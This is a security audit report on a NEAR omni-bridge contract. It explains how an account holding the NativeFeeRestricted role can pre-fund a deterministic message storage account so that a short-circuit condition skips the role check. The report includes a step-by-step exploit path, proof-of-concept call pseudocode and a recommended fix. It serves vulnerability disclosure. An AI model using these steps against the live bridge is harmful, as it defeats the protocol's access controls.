Audit Report

## Title
`NativeFeeRestricted` Role Bypass via Pre-Funded Message Storage Account - (File: `near/omni-bridge/src/lib.rs`)

## Summary
The `NativeFeeRestricted` role check in `init_transfer` is placed only inside Branch 2 of a short-circuit OR condition. Because Branch 1 (`try_to_transfer_balance_from_message_account`) contains no role check, a restricted account can pre-fund the deterministic message storage account via `storage_deposit`, causing Branch 1 to succeed and the OR to short-circuit before Branch 2's role check is ever evaluated. The result is that a `NativeFeeRestricted` account can set an arbitrary non-zero `native_token_fee` on any outbound bridge transfer.

## Finding Description
In `near/omni-bridge/src/lib.rs` lines 566–581, `init_transfer` selects a storage-payment path via:

```rust
if self
    .try_to_transfer_balance_from_message_account(   // Branch 1 – no role check
        &message_storage_account_id,
        NearToken::from_yoctonear(init_transfer_msg.native_token_fee.0),
        &signer_id,
        required_storage_balance,
    )
    .is_ok()
    || (self.has_storage_balance(...)                // Branch 2 – role check here
        && (init_transfer_msg.native_token_fee.0 == 0
            || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))
```

`try_to_transfer_balance_from_message_account` (storage.rs lines 260–290) only checks that the message account has sufficient balance and that the signer has a registered storage account. It performs no role check. If it returns `Ok`, the OR short-circuits and Branch 2—which contains the `NativeFeeRestricted` guard—is never reached.

The `message_storage_account_id` is computed deterministically from transfer parameters at line 562–563. `storage_deposit` (storage.rs line 141) accepts an arbitrary `account_id` with no restrictions, so any caller can pre-fund the message account before submitting the transfer. The exploit path is:

1. Compute `message_storage_account_id` off-chain from the intended transfer parameters.
2. Call `storage_deposit(account_id = message_storage_account_id)` with sufficient NEAR to cover `native_token_fee`.
3. Ensure the attacker's own account is also registered via `storage_deposit`.
4. Call `ft_transfer_call` with a non-zero `native_token_fee`.
5. Inside `init_transfer`, Branch 1 succeeds, OR short-circuits, `NativeFeeRestricted` check is skipped, and `init_transfer_internal` is called with the non-zero fee accepted.

## Impact Explanation
This is a concrete role bypass: an account explicitly assigned `NativeFeeRestricted` can execute a bridge transfer with a non-zero `native_token_fee`, an action the protocol explicitly prohibits for that role. This matches the allowed critical impact class of "authorization bypass, role bypass… that lets an attacker execute bridge… actions." The `NativeFeeRestricted` role (lib.rs line 124) is a protocol-level enforcement mechanism; its bypass renders any compliance, economic, or anti-abuse controls built on it ineffective.

## Likelihood Explanation
Exploitation requires only two standard public contract calls (`storage_deposit` twice, then `ft_transfer_call`). No privileged access, leaked keys, or external dependencies are needed. The message storage account ID is fully deterministic and computable off-chain. Any account assigned `NativeFeeRestricted` that is motivated to bypass it can do so repeatably with no special knowledge.

## Recommendation
Move the `NativeFeeRestricted` check unconditionally before the two-branch OR condition so it applies regardless of which storage-payment path executes:

```rust
if init_transfer_msg.native_token_fee.0 > 0 {
    require!(
        !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone()),
        BridgeError::NativeFeeRestricted.as_ref()
    );
}

if self.try_to_transfer_balance_from_message_account(...).is_ok()
    || self.has_storage_balance(...)
{
    ...
}
```

This ensures the restriction is enforced unconditionally before any storage-path selection occurs.

## Proof of Concept
```
// Precondition: attacker has NativeFeeRestricted role.

// Step 1: compute message_storage_account_id off-chain using transfer parameters.

// Step 2: pre-fund the message account
attacker.call(bridge, "storage_deposit")
    .args_json({"account_id": message_storage_account_id})
    .deposit(native_fee_amount + required_storage_balance)

// Step 3: register attacker's own account
attacker.call(bridge, "storage_deposit")
    .args_json({"account_id": attacker.id()})
    .deposit(required_balance_for_account)

// Step 4: initiate transfer with non-zero native fee
attacker.call(token, "ft_transfer_call")
    .args_json({
        "receiver_id": bridge,
        "amount": transfer_amount,
        "msg": {"InitTransfer": {"native_token_fee": native_fee_amount, "fee": 0, "recipient": eth_address}}
    })
    .deposit(1)

// Result: try_to_transfer_balance_from_message_account succeeds →
//         OR short-circuits → NativeFeeRestricted check never evaluated →
//         transfer stored with non-zero native_fee → relayer receives NEAR fee
```

A local integration test can confirm this by assigning `NativeFeeRestricted` to a test account, pre-funding the deterministic message account, submitting the transfer, and asserting that `init_transfer_internal` is called with a non-zero `native_fee`.
